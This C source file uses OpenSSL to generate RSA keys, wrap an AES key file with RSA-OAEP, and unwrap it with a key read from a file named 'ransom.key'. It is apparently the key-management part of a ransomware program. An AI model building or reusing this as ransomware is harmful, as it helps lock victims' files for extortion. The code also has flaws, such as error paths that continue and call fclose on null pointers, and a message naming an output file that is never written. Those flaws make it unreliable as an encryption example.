#include "./RSA.h"

void RSA_generate_keyring(){
    EVP_PKEY_CTX *ctx = NULL;
    EVP_PKEY *pkey = NULL;

    ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!ctx || EVP_PKEY_keygen_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0 ||
        EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        printf("Error while generating RSA keys\n");
    }
    EVP_PKEY_CTX_free(ctx);

    FILE *priv_file = fopen("./src/keys/private_key.pem", "wb");
    if (!priv_file || !PEM_write_PrivateKey(priv_file, pkey, NULL, NULL, 0, NULL, NULL)) {
        printf("Error while generating RSA keys\n");
    }
    fclose(priv_file);

    FILE *pub_file = fopen("./src/keys/public_key.key", "wb");
    if (!pub_file || !PEM_write_PUBKEY(pub_file, pkey)) {
        printf("Error while generating RSA keys\n");
    }
    fclose(pub_file);
}

void RSA_encrypt() {
    EVP_PKEY *pubkey = NULL;
    FILE *pubf = fopen("./src/keys/public_key.key", "r");
    if (!pubf) {
        perror("Public key file open failed\n");
        return;
    }
    pubkey = PEM_read_PUBKEY(pubf, NULL, NULL, NULL);
    fclose(pubf);

    if (!pubkey) {
        fprintf(stderr, "Failed to read public key.\n");
        return;
    }

    unsigned char aes_key[32];
    FILE *aes_key_file = fopen("./src/keys/AES.key", "rb");
    if (!aes_key_file) {
        perror("AES key file open failed");
        EVP_PKEY_free(pubkey);
        return;
    }
    fread(aes_key, 1, 32, aes_key_file);
    fclose(aes_key_file);

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pubkey, NULL);
    if (!ctx || EVP_PKEY_encrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
        fprintf(stderr, "Encryption init failed.\n");
        EVP_PKEY_free(pubkey);
        EVP_PKEY_CTX_free(ctx);
        return;
    }

    size_t outlen;
    if (EVP_PKEY_encrypt(ctx, NULL, &outlen, aes_key, 32) <= 0) {
        fprintf(stderr, "Failed to get encrypted length.\n");
        EVP_PKEY_free(pubkey);
        EVP_PKEY_CTX_free(ctx);
        return;
    }

    unsigned char *encrypted = malloc(outlen);
    if (EVP_PKEY_encrypt(ctx, encrypted, &outlen, aes_key, 32) <= 0) {
        fprintf(stderr, "Encryption failed.\n");
        EVP_PKEY_free(pubkey);
        EVP_PKEY_CTX_free(ctx);
        free(encrypted);
        return;
    }

    FILE *outf = fopen("./src/keys/AES.key", "wb");
    if (outf) {
        fwrite(encrypted, 1, outlen, outf);
        fclose(outf);
        printf("AES key encrypted and saved (%zu bytes).\n", outlen);
    } else {
        perror("Could not write encrypted AES key");
    }

    EVP_PKEY_free(pubkey);
    EVP_PKEY_CTX_free(ctx);
    free(encrypted);
}

void RSA_decrypt() {
    EVP_PKEY *privkey = NULL;
    FILE *privf = fopen("./src/ransom.key", "r");
    if (!privf) {
        perror("Private key file open failed");
        return;
    }

    privkey = PEM_read_PrivateKey(privf, NULL, NULL, NULL);
    fclose(privf);

    if (!privkey) {
        fprintf(stderr, "Failed to read private key.\n");
        return;
    }

    FILE *encf = fopen("./src/keys/AES.key", "rb");
    if (!encf) {
        perror("Encrypted AES key file open failed");
        EVP_PKEY_free(privkey);
        return;
    }

    fseek(encf, 0, SEEK_END);
    long enc_len = ftell(encf);
    rewind(encf);

    unsigned char *encrypted = malloc(enc_len);
    fread(encrypted, 1, enc_len, encf);
    fclose(encf);

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(privkey, NULL);
    if (!ctx || EVP_PKEY_decrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
        fprintf(stderr, "Failed to initialize decryption context.\n");
        EVP_PKEY_free(privkey);
        EVP_PKEY_CTX_free(ctx);
        free(encrypted);
        return;
    }

    size_t outlen;
    if (EVP_PKEY_decrypt(ctx, NULL, &outlen, encrypted, enc_len) <= 0) {
        fprintf(stderr, "Failed to get decrypted length.\n");
        EVP_PKEY_free(privkey);
        EVP_PKEY_CTX_free(ctx);
        free(encrypted);
        return;
    }

    unsigned char *decrypted = malloc(outlen + 1);
    if (EVP_PKEY_decrypt(ctx, decrypted, &outlen, encrypted, enc_len) <= 0) {
        fprintf(stderr, "Decryption failed.\n");
        EVP_PKEY_free(privkey);
        EVP_PKEY_CTX_free(ctx);
        free(encrypted);
        free(decrypted);
        return;
    }
    decrypted[outlen] = '\0';

    printf("Decrypted AES key (%zu bytes):\n", outlen);
    for (size_t i = 0; i < outlen; i++) {
        printf("%02x", decrypted[i]);
    }
    printf("\n");

    FILE *outf = fopen("./src/keys/AES.key", "wb");
    if (outf) {
        fwrite(decrypted, 1, outlen, outf);
        fclose(outf);
        printf("Decrypted AES key saved to ./src/keys/AES.key.dec\n");
    }

    // Cleanup
    EVP_PKEY_free(privkey);
    EVP_PKEY_CTX_free(ctx);
    free(encrypted);
    free(decrypted);
}

